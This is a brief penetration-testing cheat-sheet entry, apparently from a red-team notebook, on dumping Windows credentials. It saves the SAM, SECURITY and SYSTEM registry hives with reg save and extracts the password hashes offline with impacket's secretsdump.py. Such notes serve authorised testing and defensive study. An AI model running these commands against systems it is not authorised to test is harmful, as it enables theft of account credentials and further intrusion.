# Secretsdump

## [[SAM]]
Receiving machine passwords via impacket (Admin):
    ```powershell
    # Change permissions of hklm\security to full access
    reg save hklm\sam c:\temp\sam.save
    reg save hklm\security c:\temp\security.save
    reg save hklm\system c:\temp\system.save
    secretsdump.py -sam C:\Users\ext_nviso_admin\Desktop\sam.save -security C:\Users\ext_nviso_admin\Desktop\security.save -system C:\Users\ext_nviso_admin\Desktop\system.save LOCAL
    ```

## References


```meta
requirements: 
results: 
opsec: 
oss: #linux
source: https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py 
description: Dump credentials remote and local via sam
```